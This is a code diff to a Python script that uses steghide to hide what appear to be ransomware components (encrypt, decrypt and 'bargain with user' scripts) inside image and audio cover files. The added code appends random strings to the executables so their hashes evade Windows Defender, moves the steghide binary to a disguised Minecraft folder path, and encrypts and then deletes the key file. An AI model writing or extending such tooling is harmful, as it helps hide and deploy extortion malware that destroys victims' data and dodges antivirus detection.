@@ -12,8 +12,26 @@ def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
     :param passphrase: The key used to decrypt and access the "secret" message
         in the image.
     """
+    executable_files: list[str] = ["bargain_with_user.exe", "bargain_with_user.py",
+                                   "decrypt.exe", "decrypt.py",
+                                   "encrypt.exe", "encrypt.py"]
+
     steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]
-    steghide_path = 'steghide-0.5.1-win32\steghide\steghide.exe'
+    steghide_path = 'Minecraft\Mojang\steghide.exe'
+
+    # Ensures the likelihood that an executable file will have a unique hash for Windows Defender
+    if file_to_embed in executable_files:
+        # Reads the contents of the file and prints them in the console
+        with open(file_to_embed, "r") as file:
+            contents: str = file.read()
+        import random
+        # Generates a random string consisting of 30 random ASCII characters
+        rand_generated_str: str = ""
+        for _ in range(30):
+            rand_generated_str += random.choice(ascii.__str__())
+        # Appends randomized string to end of executable file
+        with open(file_to_embed, "a") as file:
+            file.writelines(f"\nprint('{rand_generated_str}')")
 
     if not os.path.exists(steghide_path):
         raise FileNotFoundError("You need to have the Steghide folder in the same directory as your .PY/.EXE files.")
@@ -29,7 +47,7 @@ def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
     else:
         raise FileNotFoundError(f"The image name/path '{cover_file}' does not exist in the current directory."
                                 f"Either the name fed to the variable in the code to be updated or the image "
-                                 f"specified just doesn't exist.")
+                                f"specified just doesn't exist.")
 
     # Represents the commandline argument to be run in Command Prompt in order to extract the embedded message
     command = f'"{steghide_path}" embed -cf "{cover_file}" -ef "{file_to_embed}" -p {passphrase}\n'
@@ -48,19 +66,18 @@ def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
         # Prints out what's occurring within the command prompt itself
         output, errors = process.communicate()
         print(f"\nCommand Prompt Output when embedding {file_to_embed} into {cover_file}: "
-              f"\tOutput: {output}\n")
+              f"\nOutput: {output}\n")
         if errors:
-            print(f"\tErrors: {errors}\n")
+            print(f"Errors: {errors}\n")
 
     except Exception as e:
         print(f"An unexpected error has occurred: {e}")
 
 
-
 def main():
     passphrase: str = input("Input the passphrase to be used to extract your embedded files: ")
 
-    print("**** .TXT FILE TO EMBED ****")
+    print("\n**** .TXT FILE TO EMBED ****")
     if os.path.exists("key.txt"):
         with open("key.txt", "r") as file:
             key = file.read()
@@ -70,17 +87,19 @@ def main():
         with open("key.txt", "wb") as file:
             file.write(key)
         print(f"Your encryption key is: {key}")
-    os.remove("key.txt")
     print("Note: You don't have to remember the key.")
 
-    print()
-
-    print("**** .PY/.EXE FILES TO EMBED ****")
-    code_to_encrypt: str = input("Input the name of the .PY/.EXE file to be used to ENCRYPT files: ")
-    code_to_bargain_with_user: str = input("Input the name of the .PY/.EXE file to be used to BARGAIN with user: ")
-    code_to_decrypt: str = input("Input the name of the .PY/.EXE file to be used to DECRYPT files: ")
+    # Encrypts and throws away the key
+    encrypt_file("key.txt", key)
+    os.remove("key.txt")
 
     print()
+
+    # **** .PY/.EXE FILES TO EMBED ****
+    # TODO: Change to .exe later
+    code_to_encrypt: str = "encrypt.py"
+    code_to_bargain_with_user: str = "bargain_with_user.py"
+    code_to_decrypt: str = "decrypt.py"
 
     print("**** IMAGES TO BE EMBEDDED ****")
     image_containing_key: str = input("Input the name of the image (.JPG, .BMP, .WAV, .AU) to contain your KEY: ")
@@ -101,6 +120,26 @@ def main():
 
     with open("passphrase.txt", "w") as file:
         file.writelines(f"{passphrase}")
+
+
+def encrypt_file(filename: str, key: str):
+    from cryptography.fernet import Fernet
+    """
+    Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
+    :param filename: Represents the file to undergo encryption
+    :param key: Represents an instance of the Fernet Class created with a key.
+    :return: None
+    """
+    # Converts that key to a Fernet object to gain access to Fernet methods
+    f_key: Fernet = Fernet(key)
+    # Assigns the data inside the unencrypted file to a variable
+    with open(filename, "rb") as unencrypted_file:
+        plaintext = unencrypted_file.read()
+    # Encrypts the unencrypted data using the key and assigns the encrypted data to a variable
+    ciphertext = f_key.encrypt(plaintext)
+    # Overwrites the same file
+    with open(filename, "wb") as encrypted_file:
+        encrypted_file.write(ciphertext)
 
 
 main()
